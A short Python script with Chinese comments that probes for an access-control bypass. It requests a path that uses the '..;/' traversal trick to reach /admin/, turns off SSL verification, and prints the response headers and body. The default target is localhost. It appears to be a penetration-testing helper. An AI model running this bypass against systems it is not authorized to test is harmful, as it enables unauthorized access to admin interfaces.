#!/usr/bin/env python3
"""
测试路径遍历/绕过脚本
访问 URL: /xxx/..;/admin/
"""

import requests
import sys

def test_bypass(url):
    print(f"[*] Requesting: {url}")
    try:
        # 不验证 SSL，允许重定向
        resp = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        print(f"[+] Status: {resp.status_code}")
        print("[+] Headers:")
        for k, v in resp.headers.items():
            print(f"    {k}: {v}")
        print("\n[+] Response body (first 2000 chars):")
        print(resp.text[:2000])
        if len(resp.text) > 2000:
            print("\n... (truncated)")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    target = "http://127.0.0.1:8080/xxx/..;/admin/"
    if len(sys.argv) > 1:
        target = sys.argv[1]
    test_bypass(target)